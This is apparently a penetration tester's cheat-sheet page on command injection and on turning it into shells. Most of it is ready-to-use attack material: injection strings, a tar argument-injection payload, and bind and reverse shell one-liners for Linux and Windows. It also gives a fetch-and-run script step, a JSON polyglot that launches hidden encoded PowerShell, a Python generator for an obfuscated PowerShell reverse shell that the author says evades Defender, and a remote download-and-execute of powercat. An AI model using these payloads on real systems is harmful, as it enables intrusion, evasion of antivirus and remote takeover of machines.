---
layout: blank
pagetitle: Command Injection & Reverse Shells
---

## Command Injection
- It's pretty self-explanatory

**Common ways of injecting commands**
- Classic `;id`, `| id`, `&& id`
- Newlines can be a pretty sneaky way of getting around a blacklist if the shell is invoked
  - `asdf %0A id`

**Argument injection**
- Little bit more fancy, useful if the shell isn't being invoked
- [GTFOBins](https://gtfobins.github.io/) comes in really handy here
- Example: let's say we have argument injection on `tar`
  - We can see that `tar` has `--checkpoint=1 --checkpoint-action=exec={command}` on GTFOBins
  - Thus, we don't actually even need a shell for command execution, we can simply fork a process running our commands from tar
    - This could look something like `--checkpoint=1 --checkpoint-action=exec=perl$IFS-e$IFS'system(join($x,map(chr,({decimal_characters_to_run}))))';`

**Reviewing Source Code**
- Review the source code, track functions with execution, which may be nested multiple times inside of other functions
  - C/C++: `system, exec(ve), CreateProcess, popen, fork...  `
  - Python: `subprocess.run/popen/call/etc., os.system/popen...`
  - Java: `runtime.GetRuntime.exec, ProcessBuilder.start...`
  - PHP: `system, exec, shell_exec, popen, proc_open...`
  - Go: `os/exec.Command, Cmd.Run/Output...`
  - Rust: `std::process::Command::new/spawn/output`
- Good candidates will often stand out
  - Filesystem operations (file read/writes, compression, USB I/O)
  - Database operations (Kiosks can have SQL injection too!)
  - Network configuration (good ol' ping)
- Then trace what functions you can hit from GUI/app

## Upgrading Command Injection to a Shell

- Make sure to set your listener first with `nc -lnvp {port}`
  - On mac, can just do `nc -l {port}`, though the firewall might have to be disabled

**Resources**
- A good resource here is: [Revshells](https://www.revshells.com/)
  - Can set the IP/port, and it will dynamically generate the payload

**Linux Bind Shells**
- Socat seems to be pretty solid: `socat TCP-LISTEN:{port},reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane`
  - Then, on attacker machine: ``socat FILE:`tty`,raw,echo=0 TCP:target.com:{port}``
- Python: `python3 -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",{port}));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'`
- NC: `nc -nlvp {port} -e /bin/bash`

**Linux Reverse shells**
- `bash -i >& /dev/tcp/{IP}/{port} 0>&1`
- `busybox nc {IP} {port} -e sh` or `busybox nc {IP} {port} -e /bin/sh`
- `python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{IP}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'`
- If we're restricted in characters, the best way to usually do it is to get a script on the system, and execute that
  - `wget {IP}:{port}/script.sh` -> `chmod 777 ./script.sh` -> `./script.sh`

**Making our revshell an MCP**
- Use Francisco's [agent2shell](https://github.com/0xmagic0/agent2shell), which sets up a binary that essentially catches the shell and allows anything to send commands to it
  - `make build`, then add to PATH for easy usage 
  - Catch shell with `agent2shell catch -p 4444`, then send commands with `agent2shell run '{command}'`

**Upgrading Linux Shell to a Better Shell**
- `script /dev/null -c bash`
  - Then background the existing shell with CTRL Z
  - Then on kali: `stty raw -echo; fg` (to continue the process)
  - Finally type `reset` then set the terminal type to `screen`
- Alternatively try one of these:

```sh 
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
echo 'os.system('/bin/bash')'
/bin/sh -i
/bin/bash -i
perl -e 'exec "/bin/sh";'
```

**Polyglot Payloads**
- Sometimes, you need to format a payload into a different valid filetype
- `.bat` files are excellent for this, as they'll basically parse through garbage to find executable things to run
  - For example, if we had to do JSON: `{"x\"& powershell -w hidden -exec bypass -enc {base64} & exit &\"x":"1"}` is valid JSON

**Windows Reverse Shells**
- Download/transfer netcat (nc.exe within `/usr/share/windows-resources/binaries/nc.exe`)
  - Then run `C:\Windows\Temp\nc.exe -e powershell.exe {IP} {port}` for a Powershell reverse shell
- Can also just do it with powershell alone - use this python script to generate the obfuscated payload (doesn't trip Defender, as of writing):
  - If you don't want the command window hanging around for whatever reason, the below can be adapted like so: 
    - `if not defined _Z (set _Z=1&start /min cmd /c %~f0&exit) else (powershell -w hidden -exec bypass -enc BASE64HERE &exit)`
      - This will set `_Z=1` on the first run, relaunch the same script minimized, and exit the visible window since `_Z` is now defined
      - Much faster than simply starting the window minimized

{% raw %}
```py
import base64, sys, random, string
if len(sys.argv) < 3: print('usage: %s ip port' % sys.argv[0]); sys.exit(0)
ip, port = sys.argv[1], sys.argv[2]
UNSAFE = set('ntrabfv0')
rv = lambda: '$' + ''.join(random.choices(string.ascii_letters, k=random.randint(6,12)))
rs = lambda: ''.join(random.choices(string.ascii_letters+string.digits, k=random.randint(8,20)))
ri = lambda: str(random.randint(100,999999))
def bt(cmd):
    parts = cmd.split('-')
    r = []
    for p in parts:
        sp = [i for i in range(1,len(p)) if p[i].lower() not in UNSAFE]
        if sp: i = random.choice(sp); p = p[:i]+'`'+p[i:]
        r.append(p)
    return '-'.join(r)
def ss(s):
    m = random.randint(2,len(s)-2)
    return "('%s'+'%s')" % (s[:m],s[m:])
words = 'initialize setup config validate check process handler module service update refresh sync load parse format convert buffer cache registry session context dispatch render'.split()
rc = lambda: '# %s %s %s' % (random.choice(words),random.choice(words),rs())
junk_t = [lambda: '%s = %s'%(rv(),ri()), lambda: "%s = '%s'"%(rv(),rs()),
           lambda: 'if ($false) { %s = %s }'%(rv(),ri()), rc,
           lambda: 'function %s { return %s }'%(rs(),ri()),
           lambda: '%s = [int](%s) + [int](%s)'%(rv(),ri(),ri())]
jl = lambda n=None: '\n'.join(random.choice(junk_t)() for _ in range(n or random.randint(1,3)))
vc,vs,vb,vr,vd,vx,ve,vt = rv(),rv(),rv(),rv(),rv(),rv(),rv(),rv()
payload = f"""{jl(3)}
{vt} = {ss('System.Net.Sockets.TCPClient')}
{jl(2)}
{vc} = {bt('New-Object')} {vt} ('{ip}',{port})
{jl(1)}
{vs} = {vc}.GetStream()
[byte[]]{vb} = 0..65535|%{{0}}
{jl(2)}
while(({vr} = {vs}.Read({vb}, 0, {vb}.Length)) -ne 0){{
    {rc()}
    {ve} = {bt('New-Object')} -TypeName {ss('System.Text.ASCIIEncoding')}
    {vd} = {ve}.GetString({vb},0, {vr})
    {jl(1)}
    {vx} = (& ([scriptblock]::Create({vd})) 2>&1 | {bt('Out-String')} )
    {vx} = ([text.encoding]::ASCII).GetBytes({vx} + 'ps> ')
    {vs}.Write({vx},0,{vx}.Length)
    {vs}.Flush()
    {jl(1)}
}}
{jl(2)}
{vc}.Close()
"""
b64 = base64.b64encode(payload.encode('utf-16-le'))
print("powershell -exec bypass -enc %s" % b64.decode())

```
{% endraw %}

- Run [powercat](https://github.com/besimorhino/powercat/blob/master/powercat.ps1) - `IEX(New-Object System.Net.WebClient).DownloadString('http://{IP}:{port}/powercat.ps1');powercat -c 192.168.45.220 -p 4444 -e powershell`


